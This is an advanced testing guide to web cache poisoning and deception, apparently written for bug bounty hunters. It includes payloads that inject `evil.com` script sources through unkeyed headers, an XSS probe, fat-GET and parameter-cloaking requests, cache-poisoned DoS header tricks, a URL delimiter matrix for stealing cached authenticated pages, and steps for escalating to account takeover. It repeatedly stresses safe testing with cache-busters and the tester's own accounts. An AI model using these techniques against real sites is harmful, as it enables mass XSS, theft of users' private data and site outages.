# Web Cache Poisoning & Deception — Advanced Testing Guide

**Author:** x8bitranjit
**Class:** Web Cache Poisoning · Web Cache Deception · Cache-key confusion (CDN / reverse-proxy / application cache)
**Impact ceiling:** **mass stored-XSS served to every cache visitor** · **open redirect → OAuth token/credential theft** · **theft of victims' authenticated responses** (session/CSRF tokens, PII, password-reset links → **ATO**) · **cache-poisoned DoS (site-wide outage)**.
**Primary CWE:** CWE-349 (Acceptance of Extraneous Untrusted Data) · CWE-524 / CWE-525 (Use of Cache Containing Sensitive Information) · plus the *delivered-payload* CWE (CWE-79 XSS / CWE-601 open redirect / CWE-400 DoS).

> ⚠️ **Advanced guide.** Get the basics first from **PortSwigger — Web cache poisoning** and **Web cache deception** (+ Web Security Academy labs), **HackTricks — Cache Poisoning / Cache Deception**, **James Kettle — "Practical Web Cache Poisoning" (2018)** + **"Web Cache Entanglement" (2020)**, and **Omer Gil — "Web Cache Deception Attack" (Black Hat USA 2017)**. This kit is the **caching-layer sibling of [../HostHeader/](../HostHeader/)** (`Host`/`X-Forwarded-Host` reflection) and **[../RequestSmuggling/](../RequestSmuggling/)** (desync → cache poisoning) — cross-referenced, not duplicated.

---

## Read this first — why cache bugs punch far above their weight

A web cache sits between users and the origin and answers many requests with **one saved response**. Two things go wrong, and both scale to *every user*:

1. **Cache POISONING** — you get the cache to save a response *you* influenced (via an input the cache **doesn't** include in its key), and it then serves your payload to **everyone**. A reflected header you couldn't normally weaponise (it's only in *your* request) becomes **stored XSS delivered to every visitor of that page** — no victim interaction, no auth. Direction: **attacker → cache → all victims.**
2. **Cache DECEPTION** — you trick the cache into saving a **victim's private, authenticated** response under a URL *you* can fetch, then read their session token / CSRF token / PII / password-reset link out of the cache. Direction: **victim → cache → attacker.**

**Why it pays High/Critical:**
- A single unkeyed header reflected into a cached page = **mass XSS** (every visitor) → session theft, drive-by. That is a *bigger* blast radius than a normal reflected XSS.
- Poisoned **open redirect** in a cached page → **OAuth `redirect_uri` / token theft**, credential-phishing at scale (see [../OAuth/](../OAuth/)).
- Poisoning a cached **JS/CSS resource** → attacker script runs on **every page that imports it** (site-wide compromise from one file).
- Deception can lift a victim's **session cookie surrogate, CSRF token, API key, or reset token** straight out of the response body → **account takeover**.
- **CPDoS** (cache-poisoned DoS) can take a whole site/CDN edge offline with one crafted request.

**Report impact, not the header echo.** "`X-Forwarded-Host` is reflected" is a *lead*. "This response is **cached** and served to other users with my `evil.com` in the `<script src>`, so I get **XSS on every visitor**" is the finding. Always prove **(a) you can influence the response via an unkeyed input, AND (b) the poisoned response is actually served to a *different* request** — that second half is what separates a Critical from a self-XSS non-issue.

**The one mental model.** A cache stores a response under a **cache key** (usually method + host + path + *some* query/headers). Every request input the cache **ignores when building the key** but the **origin still reflects/acts on** is a poisoning primitive. Every response the cache stores that the origin **only meant for one authenticated user** is a deception primitive. Your whole job is **finding the mismatch between what the cache keys on and what the origin does.**

---

## Master Testing Sequence — the testing order

> **This is the spine.** Work top-to-bottom. Numbered sections are reference detail; this is the order you execute. **Use a cache-buster on every probe (§3) so you never poison the real shared cache for real users.**

```
PHASE 0  MAP THE CACHE   → is there a cache? which layer (CDN/proxy/app)? build a HIT/MISS oracle (§1–§2)
PHASE 1  KEY DISCOVERY ★ → find UNKEYED inputs (headers/params) with a cache-buster + canary; Param Miner (§3–§4)
PHASE 2  POISONING  ⭐    → unkeyed header → reflected → XSS/redirect (§5) · resource poisoning (§6) ·
                           fat-GET/param cloaking (§7) · key normalization/entanglement (§8) · DOM/multi-step (§9) ·
                           CPDoS (§10) · smuggling→cache (§11)
PHASE 2' DECEPTION  ⭐    → path-confusion /account.css (§12) · delimiter matrix ;%0a%3f%23%2f (§13) ·
                           extension/dir rules (§14) · steal the victim's authenticated response (§15)
PHASE 3  VARIANTS        → browser cache poisoning · bfcache · cache-key injection (§16)
PHASE 4  VALIDATE→REPORT → FP filter (§17) · CVSS+CWE (§18) · escalation playbooks (§19) ·
                           SAFE-PoC: cache-buster + own accounts, DO NOT harm users (§20) · dedup+report (§21)
```

**Phase-by-phase deliverable:**
1. **PHASE 0 — Map.** Confirm a cache exists on the target page and build a reliable **HIT/MISS oracle** (§2). *Deliverable:* "this URL is cached by `<CDN>`; here's how I see hit vs miss."
2. **PHASE 1 — Key discovery ⭐.** With a **cache-buster** isolating your own key, find inputs that change the response but are **unkeyed** (§3–§4). *Deliverable:* a list of unkeyed, reflected inputs.
3. **PHASE 2 — Poison.** Turn an unkeyed input into a stored payload (XSS/redirect/resource/DoS) and **prove it's served to a clean request** on the same key (§5–§11). *Deliverable:* a cached malicious response hitting a second request.
4. **PHASE 2' — Deceive.** Make the cache store your **own** authenticated page under an attacker-fetchable URL, then read it back unauthenticated (§12–§15). *Deliverable:* your private marker retrieved from cache without your session.
5. **PHASE 4 — Validate → report.** FP filter, CVSS/CWE, safe PoC (cache-buster, own accounts, no real-user harm), dedup, write it (§17–§21).

Reference anytime: payloads → `WEB_CACHE_ARSENAL.md`; checklist → `WEB_CACHE_CHECKLIST.md`; scripts → `poc/`; playbooks **§19**.

---

# PART I — FOUNDATIONS & RECON (find the cache, find the keys)

# 1. How web caches work (and where they live)

A cache saves a response and re-serves it for later matching requests. It decides "same request?" using the **cache key** — normally `scheme + host + path + (some) query params`, and **occasionally** a few headers named in `Vary`. Everything else in your request is **unkeyed**: the origin sees it, but the cache pretends it doesn't exist when matching.

**Cache layers you'll meet (each is a target):**
```
CDN / edge:       Cloudflare · Akamai · Fastly (Varnish) · AWS CloudFront · Azure CDN · Google Cloud CDN · Sucuri · Imperva
Reverse proxy:    Varnish · nginx proxy_cache · Apache Traffic Server · Squid · HAProxy(cache)
App / framework:  Drupal cache · WordPress (WP Rocket/W3TC) · Rails/Rack cache · Next.js/Vercel data & full-route cache · Spring Cache
Browser:          the user's own HTTP cache + bfcache (§16)
```
Different layers key differently and parse URLs differently — **that mismatch is the whole game** (a request the origin resolves one way and the cache keys another way = entanglement/deception).

**Static vs dynamic caching rules (what gets cached at all):**
- By **file extension** (`.js .css .png .ico .svg .woff .jpg .pdf …`) — the classic cache-deception lever.
- By **path prefix / directory** (`/static/ /assets/ /media/ /public/`).
- By **`Cache-Control` / `Expires` / `s-maxage`** on the response (origin *tells* the cache to store it).
- By **CDN page rules** (per-path caching a customer configured — often over-broad).
- **Heuristic caching** — some caches store a 200 with no explicit `Cache-Control` for a while.

---

# 2. Detect a cache & build a HIT/MISS oracle

You cannot test either bug without a reliable way to see **"did this come from the cache or the origin?"** Send the same request **twice** and read the tell-tale headers.

**Cache indicator headers (grep the response):**
```
X-Cache: hit / miss / HIT / MISS            (Fastly/CloudFront/Varnish/many)
CF-Cache-Status: HIT / MISS / DYNAMIC / EXPIRED / BYPASS   (Cloudflare)
X-Cache-Hits: 3                             (Varnish — hit counter)
Age: 137                                    (seconds since cached — >0 and GROWING = a hit)
X-Served-By / X-Cache / X-Timer             (Fastly)
X-Varnish: 12345 67890                      (two IDs = a hit)
X-Drupal-Cache: HIT                         (Drupal)
X-Proxy-Cache / X-Litespeed-Cache / X-Vercel-Cache: HIT / STALE / PREM
Cache-Control / Expires / Vary / Pragma / ETag / Last-Modified   (policy hints)
```
**The oracle in practice:**
```
1) Request URL?cb=RANDOM once  → note X-Cache/CF-Cache-Status = MISS, Age: 0.
2) Request the SAME URL?cb=RANDOM again → X-Cache = HIT (or Age > 0 and rising).
   → the response is cacheable and you now have a hit/miss oracle.
3) No indicator headers? Use TIMING (a hit is much faster) and Age growth; or a dynamic marker:
   if a per-request value (timestamp/nonce/CSRF) is IDENTICAL on the 2nd request, it was cached.
```
> **If this → then that:** the page is cached (HIT on the 2nd request) → proceed to key discovery (§3). Purely `CF-Cache-Status: DYNAMIC` / `Cache-Control: no-store` on *every* variant → that exact response isn't cached; pivot to **static resources** (JS/CSS/images — almost always cached → resource poisoning §6) or to **deception** (§12, which caches *responses that shouldn't be*).

---

# 3. The cache-buster — your safety belt AND your microscope

**Always add a unique, keyed value to your request so your test response lands under YOUR key, not the shared one.** This does two things:
- **Safety (non-negotiable):** you poison **only your own cache entry**, never the page real users receive. Testing poisoning **without** a cache-buster on production = you just XSS'd real customers = out-of-scope harm. Don't.
- **Isolation:** a fresh key = a guaranteed MISS you control, so you can cleanly see whether *your* input changed *your* cached response.

**How to bust the key (pick one that IS part of the key):**
```
Query param:   /path?cb=8f3a1  (most common — a random param is usually keyed)
Cache-buster in a keyed header: often the origin/host, or a param the app ignores but the cache keys.
If ?cb= is UNKEYED (your buster gets ignored too), use a keyed param the app tolerates, or a unique path
  (/path/;cb=8f3a1 , /path?utm_x=8f3a1) — verify the buster actually creates a fresh MISS each value.
```
> **Golden safety rule:** confirm the buster is **keyed** (each new value = a MISS) *before* you send any payload. If you can't isolate a private key, **do not fire poisoning payloads at a shared production cache** — describe the primitive and test on a staging/own key instead (§20).

---

# 4. Discover UNKEYED inputs (the poisoning primitive)

An **unkeyed input** = something the origin reflects or acts on, but the cache **omits from the key**. Find them by planting a **canary** and checking two things: *does it reflect?* and *is it served to a request that DIDN'T send it?*

**The canary method (per candidate input):**
```
1) GET /path?cb=UNIQUE          with   X-Forwarded-Host: canary8f3a.example
2) Does "canary8f3a" appear in the response body/headers (a link, redirect, script src, og:url…)? → reflected.
3) GET /path?cb=UNIQUE  AGAIN, WITHOUT the header.
4) Is "canary8f3a" STILL in the response (served from cache)? → the header is UNKEYED and POISONABLE. ⭐
   (If step 4 loses the canary, the input is keyed or not cached — not a poisoning primitive on its own.)
```
**High-yield unkeyed inputs to test (headers):**
```
X-Forwarded-Host        X-Host                 X-Forwarded-Scheme      X-Forwarded-Proto
X-Forwarded-Server      X-Forwarded-Port       X-Forwarded-For         Forwarded
X-Original-URL          X-Rewrite-URL          X-Original-Host         X-HTTP-Method-Override
X-Forwarded-SSL         X-Real-IP              True-Client-IP          CF-Connecting-IP
X-Wap-Profile           X-Timer                Accept-Language / Accept-Encoding (Vary-dependent)
<any custom app header the JS/app reads — guess with Param Miner's wordlist>
```
**High-yield unkeyed inputs (query/body):**
```
utm_*, fbclid, gclid (often stripped from the key by the CDN but read by the app) · duplicate params (?x=1&x=2) ·
a param the app reflects into a canonical/og:url/redirect · "fat GET" body params (§7).
```
> **Tooling:** **Param Miner** (Burp extension, James Kettle) automates this — it brute-forces thousands of header/param names, plants cache-busted canaries, and flags "unkeyed input" + "unkeyed header" candidates for you. Verify each by hand with the 4-step canary above. `poc/poison_probe.py` does the same for a targeted header list, cache-buster-safe.

---

# PART II — WEB CACHE POISONING (attacker → cache → every victim)

> Every probe uses a **cache-buster** (§3). You are proving a primitive on **your own key**; you weaponise it against the shared key **only** with explicit authorization and a benign marker (§20).

# 5. Classic unkeyed-header poisoning → XSS / redirect

The bread-and-butter: an unkeyed header (usually `X-Forwarded-Host`/`X-Host`/`X-Forwarded-Scheme`) is reflected into the response somewhere that **executes or redirects**, and the response is cached.

**Where the reflection lands decides the impact:**
```
Reflected into a <script src>, <link href>, <img src>, import, or absolute resource URL:
   X-Forwarded-Host: evil.com  →  <script src="//evil.com/app.js">  →  ATTACKER JS ON EVERY VISITOR = stored XSS. ⭐⭐⭐
Reflected into an HTTP redirect (Location) or a <meta>/canonical/og:url:
   X-Forwarded-Host: evil.com  →  Location: https://evil.com/…      →  cached OPEN REDIRECT → OAuth token theft/phishing.
Reflected raw into HTML (attribute/body) without encoding:
   X-Forwarded-Host: "><script>alert(document.domain)</script>      →  cached reflected-XSS = mass XSS.
Reflected into a header used by the browser (CSP report-uri, Link: preload):
   → can weaken CSP or preload attacker resources for everyone.
```
**Method (on your cache-busted key, benign marker first):**
```
1) Confirm unkeyed + reflected (§4) with a benign canary.
2) Swap the canary for a benign PROOF payload that shows control WITHOUT harming users:
   - resource import: point at a host you control that serves a harmless alert(document.domain) — prove on YOUR key only.
   - redirect: point Location at your benign domain and show it's cached.
3) Show the poisoned response is returned to a SECOND request to the same key (the "served to others" half). ⭐
4) STOP. One benign proof on your own key is the finding; do not leave a live XSS on the shared cache.
```
> **If this → then that:** unkeyed `X-Forwarded-Host` reflected in a `<script src>`/`<link>` and cached → **Critical mass-XSS** (attacker JS on every visitor). Reflected only in a `Location`/canonical → **cached open redirect** → chain to **OAuth token theft** ([../OAuth/](../OAuth/)) / credential phishing. Reflected but HTML-encoded and *not* in a URL context → likely **informational** unless you can break the encoding (try `X-Forwarded-Scheme`, `X-Forwarded-Port`, or a second reflection).

---

# 6. Resource poisoning — poison one cached JS/CSS, own every page

Even when the HTML page is `no-store`, the **static resources it imports are almost always cached** (that's the whole point of a CDN). Poison `/app.js` or `/styles.css` and **every page that imports it** runs your payload.

```
Targets:  /static/app.js  /assets/main.css  /vendor/*.js  /wp-includes/*.js  a shared analytics/config JS.
Levers:   - unkeyed header reflected INTO the resource body (some apps template config into JS: window.API="…host…").
          - a JS/JSON endpoint that reflects a param/header into its body and is cached.
          - request-smuggling a poisoned resource response into the cache (§11).
Impact:   attacker-controlled JS cached as a trusted first-party resource → XSS on every importing page, site-wide. ⭐⭐⭐
```
> **If this → then that:** a cached JS file reflects `X-Forwarded-Host` (or a param) into its body → you can rewrite the app's runtime config / inject code that executes first-party on every page → **site-wide Critical**. Even a cached **CSS** injection can exfiltrate data (attribute selectors, `@import`) or deface — file it, but JS is the crown jewel.

---

# 7. Fat GET, unkeyed query params & parameter cloaking

When headers are locked down, the **URL itself** hides primitives — because the cache and origin **parse the query string differently**.

**Fat GET (body on a GET):** some origins read GET **body** params; caches key only on the URL → the body is 100% unkeyed.
```
GET /search?cb=UNIQUE HTTP/1.1
Content-Length: 21

q=<reflected-payload>          ← origin reads body q=, cache ignores it → unkeyed reflection
```
**Duplicate / array params:** cache keys the first, origin uses the last (or vice-versa).
```
/path?cb=U&lang=en&lang=<payload>     (or ?param[]=a&param[]=<payload>)
```
**Parameter cloaking:** hide a param from the cache using a delimiter the **cache** treats as part of one value but the **origin** splits.
```
/path?cb=U&utm_content=x;callback=<payload>     ← cache sees one utm_content value (keyed/ignored);
                                                   origin splits on ';' and reads callback= → unkeyed injection.
/path?cb=U&param=x%0Acallback=<payload>          (newline/encoded delimiter differences)
```
> **If this → then that:** the CDN **excludes** a param class from the key (common: `utm_*`, `fbclid`, analytics params) but the **origin reflects it** → that param is an unkeyed primitive → JSONP `callback`, redirect targets, and reflected values become **poisonable**. Confirm with the canary (§4) that a second request without the param still returns your value.

---

# 8. Cache-key normalization & injection ("Web Cache Entanglement")

Kettle's 2020 class: the cache **normalizes** the key (lowercases, decodes, strips, reorders, trims) **differently** from how the origin resolves the request. You exploit the delta to make **two different requests share one key** — smuggling your response under the victim's key, or vice-versa.

```
Key normalization leaks (probe each):
  - Case:      /Path vs /path — cache folds case, origin doesn't (or the reverse).
  - Decoding:  %2f, %2e, %00, %23 in the path — does the cache decode before keying but origin after?
  - Trailing:  /path/ vs /path ; /path? ; /path;x — normalized to one key but routed differently.
  - Excluded params keyed inconsistently (the cloaking of §7 at the KEY level).
  - "Cache key injection": inject a delimiter that the cache includes in the key so you can craft/guess a victim's key.
```
Technique: find an input that **changes the response** (origin acts on it) but is **normalized OUT of the key** (cache ignores it) → classic unkeyed primitive. Or find an input **kept in the key by the cache but ignored by the origin** → you can pre-compute/populate a victim's cache entry.
> **If this → then that:** the cache decodes/normalizes the path (`/%61pp.js` → `/app.js`) before keying, but the origin serves based on the raw path → you can poison the normalized key that real users hit while requesting a "different" raw URL. These are subtle — use the **hit/miss oracle + a benign marker**, and read Kettle's "Web Cache Entanglement" for the exact per-CDN quirks.

---

# 9. DOM-based & multi-step / internal cache poisoning

- **DOM cache poisoning:** the cached response reflects an unkeyed input into a value a **client-side script** later reads and sinks (`innerHTML`, `location`, `eval`, script `src`). The server response looks benign, but the browser turns the cached data into XSS. Pair this kit with **[../XSS/](../XSS/)** sink analysis and **[../JSFiles/](../JSFiles/)** to find the sink.
- **Multi-step / chained:** the poisoned value isn't dangerous alone but feeds a second request/endpoint (a cached config JSON → read by the app → injected downstream).
- **Internal cache poisoning:** the front-end is fine, but an **internal** cache (between microservices) trusts an internal header — poison it to reach an admin/back-office surface.
> **If this → then that:** the reflection is in JSON/JS the front-end consumes (not directly in HTML) → hunt the **client-side sink**; a cached `config.json` with `apiBaseUrl` you control → the SPA sends tokens to your host, or loads code from it → Critical, even though the raw response "just reflects."

---

# 10. Cache-Poisoned DoS (CPDoS) — deny service to everyone

Poison the cache with an **error/oversized** response so the cache serves *that* to every user. Site-wide outage from one request. **This is a DoS — treat it with strict discipline (§20): prove cacheability of the error on a cache-busted key or on staging; never take down a production page real users are hitting.**
```
HHO  (HTTP Header Oversize):  send an oversized header the ORIGIN rejects (400/431) but the CDN forwards & caches the error.
HMC  (HTTP Meta Character):   inject a meta/control char (\n, \r, \a, %00) that the origin errors on but the cache caches.
HMO  (HTTP Method Override):  X-HTTP-Method-Override: POST/DELETE → origin errors, error gets cached for the GET key.
Symptom: after one crafted request, a normal request to the same key returns the cached 400/404/403 → outage.
```
> **If this → then that:** an oversized/meta-char header makes the origin return an error that the CDN then **caches** for the shared key → **CPDoS (High/Critical availability)**. Demonstrate on your **own cache-busted key** (show the error is cached), state the shared-key impact, and **do not** execute it against the live shared cache. Cross-ref [../HostHeader/](../HostHeader/) and [../RequestSmuggling/](../RequestSmuggling/) for related availability abuse.

---

# 11. Cache poisoning via HTTP request smuggling

The most powerful delivery: use a **desync** ([../RequestSmuggling/](../RequestSmuggling/)) to make the front-end cache store **your** smuggled response against **another user's** request/URL — no reflection needed, and it hits the *shared* key directly.
```
Smuggle a request whose response the cache attributes to the NEXT victim's request → their cached page is now yours.
Or smuggle a request for /static/app.js with a poisoned response → cached as the real resource.
```
> **If this → then that:** the target is smuggling-vulnerable **and** fronted by a cache → you can poison the **shared** cache directly (Critical), bypassing the unkeyed-input requirement. This is where request smuggling escalates from "desync" to "mass XSS/redirect" — see the RequestSmuggling kit for building the desync, then use this kit's impact model.

---

# PART III — WEB CACHE DECEPTION (victim → cache → attacker)

> Deception steals the **victim's own authenticated response** out of the cache. You prove it with **two of your own accounts / sessions** and a **benign private marker** (your test account's email/username), never a real user's data (§20).

# 12. The core deception attack — path confusion

The origin serves a **dynamic, authenticated** page (`/account`, `/settings`, `/api/me`) but the cache, seeing a **static-looking** URL, stores it. Then the attacker requests that same URL and gets the **victim's** cached private page.

**The classic:**
```
1) Victim is logged in. Attacker lures them to:   https://target/account/nonexistent.css
2) ORIGIN ignores the extra path segment / suffix and serves the VICTIM's /account page (200, full private data).
3) CACHE sees ".css" → "static, cacheable" → stores the victim's private response under /account/nonexistent.css.
4) ATTACKER requests https://target/account/nonexistent.css (no session) → gets the VICTIM's cached account page. ⭐
```
The lure can be any low-interaction vector (a link, an <img>/<iframe> to the URL, an email). What leaks: names, emails, addresses, **CSRF tokens**, **API keys in the page**, **session surrogates**, **password-reset links** — often enough for **ATO**.
> **If this → then that:** requesting `/private-page/x.css` **with your session** returns your private data AND it comes back on a **second request without the session** → **Web Cache Deception confirmed** → rate by what's in the body (CSRF token/PII = High; session/reset token/API key = **Critical/ATO**).

## 12.1 Real-world deception — the cases that defined it

**Web Cache Deception (Omer Gil, Black Hat USA 2017 — the origin of the class).** The technique was born on **PayPal**: a logged-in user who visited `https://www.paypal.com/myaccount/home/ex.css` was served their **own account page** — the server ignored the `/ex.css` suffix and routed back to `/myaccount/home` — and the CDN, seeing a `.css` extension, **cached that authenticated HTML**. Anyone who then requested the same URL read the victim's cached account page (name, email, transaction data). One decorative suffix turned a private page into a public one. This is still the mental model to hold: **origin ignores the suffix → cache stores by the suffix.**

**"Web Cache Deception Escalates!" (Mirheidari, Golinelli, Onarlioglu, Kirda, Kruegel — USENIX Security 2022).** A large-scale study (≈340 high-traffic sites) proved the attack is far broader than the naive `/page.css` trick: it is fundamentally about **URL-parsing discrepancies** between origin and cache. They showed that **path parameters** (`;`), **encoded delimiters** (`%3f %23 %2f %00 %0a`), and **path-normalization** differences reach sensitive endpoints the naive suffix cannot — and that many sites "protected" against classic WCD were still exploitable through a delimiter the **origin truncates but the cache keys**. WCD stays a **regularly-paid bounty finding** on portals, banking, and SaaS because that origin↔cache parsing mismatch is easy to reintroduce.

> **Takeaway:** don't stop at `/account.css`. When the naive suffix is blocked (a Content-Type check or Cloudflare's Cache Deception Armor), the **delimiter matrix in §13 is what still lands** — that expansion *is* the 2022 research.

---

# 13. The delimiter / path-confusion matrix (origin vs cache parsing)

Modern deception (per **Mirheidari et al., "Web Cache Deception Escalates!", USENIX 2022**) is about **URL-parsing discrepancies** between origin and cache. Walk the matrix against a sensitive endpoint (with your own session), watching the HIT/MISS oracle:

```
Base sensitive URL:  /account          (or /api/me, /settings, /orders)

Static-suffix:       /account.css   /account.js   /account.jpg   /account/x.css   /account/x.js
Path parameter:      /account;.css   /account;foo=bar.css        (matrix/';'-params origin ignores, cache sees .css)
Encoded delimiters:  /account%2f.css     (encoded '/')     /account%00.css   (null)
                     /account%3f.css     (encoded '?')     /account%23.css   (encoded '#')
                     /account%0a.css     (encoded newline) /account%09.css   (tab)   /account%5c.css ('\')
Double-encode:       /account%252ecss    /account%253f.css
Segment tricks:      /account/%2e%2e/account.css   ; /static/..%2f account (dir-rule confusion)
Dot/normalize:       /account/.css   /account/./x.css
```
For each: does the origin still return **your private content**, and does the response become a **cache HIT** on a second (session-less) request? A "yes/yes" is a confirmed deception primitive.

**Read every row as origin-parsing × cache-keying — that product *is* the bug:**

| Delimiter class | What the ORIGIN does (→ returns private page) | What the CACHE does (→ stores it) | Example |
|---|---|---|---|
| **Static suffix** `.css`/`.js`/… | routes `/account/x.css` back to `/account` (extra segment ignored) | extension is on the cacheable-static list | `/account/x.css` |
| **Path parameter** `;` | Tomcat/Spring/Java treat `;matrix` params as *not* part of the path → serve `/account` | keeps the whole string, sees `.css` at the end | `/account;x.css` |
| **Encoded `?`** `%3f` | URL-decodes, truncates the "query" → `/account` | does **not** decode; keys the literal `…%3f.css` | `/account%3f.css` |
| **Encoded `#`** `%23` | decodes to a fragment, drops the rest → `/account` | keys the literal string incl. `.css` | `/account%23.css` |
| **Encoded `/`** `%2f` | normalizes `%2f`→`/` *after* routing → `/account` | keys `%2f` literally | `/account%2f.css` |
| **Newline / null** `%0a` `%00` | truncates the path at the control char → `/account` | keys the full literal | `/account%0a.css` |
| **Directory rule** | dynamic page routed "under" a static dir via `..%2f` | trusts `/static/*` `/assets/*` as always-cacheable | `/static/..%2faccount` |

**CDN tendencies — fingerprint first (arsenal §0), then verify per row (don't assume):**
- **Cloudflare** caches by a **static file-extension list**; **Cache Deception Armor** (when enabled) refuses to cache if the response `Content-Type` doesn't match the extension → the naive `.css` is blocked, but a delimiter that makes the origin emit a static `Content-Type`, or an encoded form Armor doesn't normalize, can still land.
- **Akamai / CloudFront** commonly cache on **extension + path pattern** → the path-parameter (`;`) and encoded-delimiter rows are the usual winners.
- **Varnish / Fastly** are **VCL-defined** — behavior is whatever the operator wrote; test every row.
- There is **no universal answer**: the exploitable row is the one where *this* origin still returns your private body **and** *this* cache flips it to a session-less HIT.

> **If this → then that:** `/account` is `no-store` but `/account%3f.css` (origin drops everything after the decoded `?`, cache keys the `.css`) returns your private page **and** caches it → deception via **delimiter discrepancy** → try every row above; the one that both **preserves private content** *and* **flips to a cache HIT** is your exploit.

---

# 14. Extension & directory caching rules; content-type confusion

Understand *why* the cache stored it, so you can pick the right suffix and argue impact:
```
Extension rule:   CDN caches by suffix (.css .js .png .ico .svg .woff .gif .jpg .pdf .txt .json …). Try several —
                  some sensitive endpoints refuse .css routing but accept .js or .jpg.
Directory rule:   /static/* /assets/* /media/* cached regardless of content → can you route a dynamic page "under" it?
                  /static/..%2faccount   ,  /assets/%2e%2e/settings
Content-type:     origin returns text/html but the CDN caches on URL pattern, ignoring Content-Type → private HTML cached.
No-cache header ignored:  some CDNs cache a "static-looking" URL EVEN IF the origin set Cache-Control: no-store
                  (the classic deception root cause — the CDN's static rule overrides the origin's intent).
```
> **If this → then that:** `.css` doesn't cache but `.js` does (different CDN rule) → switch suffix. The origin sets `no-store` but the URL still caches → that's the **CDN's static rule overriding origin intent** — the exact misconfig behind most real-world deception; report it as such with the remediation (cache only by `Content-Type`, honor `Cache-Control`, enable "Cache Deception Armor").

## 14.1 Finding deception-prone endpoints (discovery)

You need an endpoint that (a) returns **private, per-user data** in the body, (b) is served **200** on a **loosely-routed path** (extra segment/suffix ignored), and (c) sits behind a cache that stores by URL shape. Hunt for:
- **Authenticated GET pages that render PII/tokens:** `/account`, `/profile`, `/settings`, `/billing`, `/orders`, `/messages`, `/api/me`, `/api/v*/user`, `/dashboard`, and **password-reset landing pages** (they carry the reset token in the page).
- **Loose routing:** append `/x.css` (then each §13 delimiter) and check the page **still returns your data with 200** — not a 404 or a redirect to login. That "ignores the suffix" behavior is the precondition; without it there's no deception.
- **Cacheability tells:** the crafted URL comes back with a HIT tell (`Age` rising, `CF-Cache-Status: HIT`, `X-Cache: HIT`) on a second request — *even though* the base `/account` is `no-store`. Loop the matrix with `poc/deception_probe.py`.

## 14.2 Defenses — and why deception still happens

| Control | What it does | Why it can still fail |
|---|---|---|
| **Cache by `Content-Type`, not URL suffix** | store only true `text/css`/`image/*` responses | an origin that emits `text/html` for `/account.css` is safe — until a delimiter makes it emit a static Content-Type |
| **Honor `Cache-Control: no-store/private`** | the origin's intent wins | the classic root cause is the **CDN static rule overriding the origin** — audit that the CDN actually obeys it |
| **Cloudflare Cache Deception Armor** | refuses to cache when extension ≠ Content-Type | encoded-delimiter / path-parameter rows Armor doesn't normalize can bypass it — test them |
| **Never cache authenticated responses** (`Vary: Cookie`, only cache `Set-Cookie`-free) | user-specific pages never enter a shared cache | one endpoint that drops the cookie requirement re-exposes it |

> The recurring root cause: **the cache's "this looks static" heuristic overrides the origin's "this is private" intent.** Report deception as *that* misconfiguration, and recommend: cache by Content-Type, honor `Cache-Control`, enable Deception Armor, and serve authenticated pages `no-store, private`.

---

# 15. Confirm & steal the victim's authenticated response (two-account model)

Prove it safely and unambiguously with **your own** two identities:
```
1) Session A (your "victim" test account) requests the crafted URL:  GET /account/x.css   (Cookie: session=A)
   → returns YOUR-A private marker (e.g. your test email a-8f3a@poc) with a cacheable response.
2) Session B (your "attacker" = a different browser / no cookies) requests the SAME URL:  GET /account/x.css
   → returns Session A's marker from cache → deception PROVEN, cross-session. ⭐
3) Rate by the leaked content: PII → High ; CSRF token → High (enables CSRF-as-victim) ;
   session token / API key / password-reset link → Critical (direct ATO).
4) STOP: you proved cross-session theft with YOUR OWN accounts and a benign marker. Do not harvest real users.
```
`poc/deception_probe.py` automates the two-request (with-session / without-session) confirmation against a marker you supply.
> **If this → then that:** Session B sees Session A's marker → you have **cross-user data theft from the cache**. If the body contains a **reusable auth artifact** (bearer/CSRF/reset token) → escalate to **ATO** and lead the report with that.

## 15.1 From leak to takeover — what each cached artifact buys you

| What's in the cached body | Escalation | Ceiling |
|---|---|---|
| **Session token / JWT / bearer** (in a `<script>`, JSON, or header) | replay it as the victim | **ATO (Critical)** |
| **Password-reset link/token** (on a reset landing page) | complete the reset → own the account | **ATO (Critical)** |
| **CSRF token** | pair with a CSRF PoC → state-changing action **as the victim** (email/password change) | **High → ATO** |
| **API key / signed URL** in the page | call the API / fetch the object as the victim | **High/Critical** |
| **PII** (name, email, address, balance, KYC) | cross-user disclosure; each seeded key = another victim | **High** |

Widen the blast radius honestly: one deception primitive on a high-traffic authenticated route means **every lured victim (or whoever's page the cache already stored) leaks** — state that population in the report, but **prove it with your own two accounts only** (§20).

---

# PART IV — BROWSER & OTHER CACHE VARIANTS

# 16. Browser cache poisoning, bfcache & cache-key injection

- **Browser cache poisoning (CWE-525):** poison the *victim's own browser cache* (e.g. via a header/response your injected content controls, or a self-XSS that writes a poisoned resource) so a resource stays malicious across navigations. Lower blast radius than shared-cache, but persistent per-victim.
- **Back/forward cache (bfcache):** sensitive pages restored from bfcache after logout can leak data / re-enable a "logged-out" UI that still holds tokens — test logout → back button.
- **Cache-key injection:** inject characters into the key so you can **populate or predict** a victim's cache entry (partner technique to §8/§13).
> **If this → then that:** the app serves sensitive pages that survive **logout via bfcache/browser cache** (no `Cache-Control: no-store, private`) → session/PII exposure on shared computers → Medium/High; recommend `Cache-Control: no-store` + `Clear-Site-Data` on logout.

---

# PART V — VALIDITY, SEVERITY & REPORTING

# 17. False positives — STOP reporting these (auto-reject)

| # | Commonly mis-reported | Why it's NOT (yet) a finding | What makes it real |
|---|---|---|---|
| 1 | **A header is reflected** (`X-Forwarded-Host` echoed) | Reflection ≠ poisoning; if it's *keyed*/not cached it only affects *your* request | The response is **cached** and the canary is served to a **second request that didn't send the header** (§4) |
| 2 | **`{{7*7}}`-style / any payload works but only in *your* response** | That's self-XSS — no other user gets it | Prove it's returned from **cache** to a clean request on the shared key (with a buster for safety) |
| 3 | **`Cache-Control: public` exists** | A header ≠ a cached sensitive response | An actual **HIT** on a sensitive/authenticated response (deception) |
| 4 | **Deception "works" but only with your own cookie present** | You just fetched your own page | Session **B / no cookie** retrieves session **A**'s marker (cross-session, §15) |
| 5 | **`Age: 0` / `CF-Cache-Status: DYNAMIC` everywhere** | Not cached → no poisoning of that response | Find a cached variant (static resource / a cacheable path) |
| 6 | **Param Miner "unkeyed input" with no reflection/impact** | Tool lead, not proof | Manual canary reflect + served-to-others + a concrete XSS/redirect/leak |
| 7 | **Open redirect that isn't cached** | That's a plain open redirect (its own, lower, bug) | The redirect is **cached** → served to everyone (raises severity) |
| 8 | **CPDoS shown by hitting the origin error once** | Erroring the origin ≠ caching the error | The **error is cached** and returned to a *subsequent* clean request |

